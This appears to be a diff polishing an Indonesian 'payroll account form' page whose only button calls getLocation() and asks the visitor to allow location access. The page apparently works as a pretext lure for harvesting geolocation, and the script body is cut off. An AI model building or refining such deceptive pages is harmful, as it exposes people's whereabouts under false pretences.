@@ -1,11 +1,63 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>Input rekening penggajian</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Form Rekening Penggajian</title>
+  <style>
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: #f1f4f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 10px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+
+    h3 {
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    button {
+      background-color: #1976d2;
+      color: white;
+      border: none;
+      padding: 12px 25px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background-color: #125ea4;
+    }
+
+    .note {
+      margin-top: 15px;
+      font-size: 13px;
+      color: #777;
+    }
+  </style>
 </head>
 <body>
-  <h3>Klik tombol lanjutkan untuk isi nomore rekenig untuk penggajian</h3>
-  <button onclick="getLocation()">Lanjutkan</button>
+  <div class="container">
+    <h3>Silakan lanjutkan untuk mengisi nomor rekening penggajian Anda</h3>
+    <button onclick="getLocation()">Lanjutkan</button>
+    <p class="note">Pastikan perangkat Anda mengizinkan akses lokasi.</p>
+  </div>
 
   <script>
     function getLocation() {
